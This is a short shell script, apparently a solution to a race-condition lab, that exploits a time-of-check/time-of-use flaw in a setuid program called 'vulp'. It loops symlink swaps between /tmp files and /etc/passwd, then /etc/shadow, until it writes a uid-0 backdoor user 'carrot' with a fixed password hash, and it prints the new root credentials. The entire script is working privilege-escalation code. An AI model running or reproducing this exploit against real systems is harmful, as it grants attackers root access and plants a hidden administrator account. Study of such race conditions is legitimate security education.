#!/bin/sh


old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
touch /tmp/ZYX
while [ "$old" = "$new" ]
do
    ln -sf /tmp/ZYX /tmp/XYZ
    echo "carrot:x:0:0:carrot:/root:/bin/bash" | ./vulp &
    ln -sf /etc/passwd /tmp/XYZ
    new=`ls -l /etc/passwd`
done

echo "STOP... The /etc/passwd file has been changed"

old=`ls -l /etc/shadow`
new=`ls -l /etc/shadow`
while [ "$old" = "$new" ]
do
    ln -sf /tmp/ZYX /tmp/XYZ
    echo "carrot:\$1\$312\$wvJjqn48qHEp.DhR./47R/:::::::" | ./vulp &
    ln -sf /etc/shadow /tmp/XYZ
    new=`ls -l /etc/shadow`
done

echo "STOP... The /etc/shadow file has been changed"
echo "#--------------------------#"
echo "# New root user created!   #"
echo "#                          #"
echo "# Username: carrot         #"
echo "# Password: imaredroot     #"
echo "#--------------------------#"

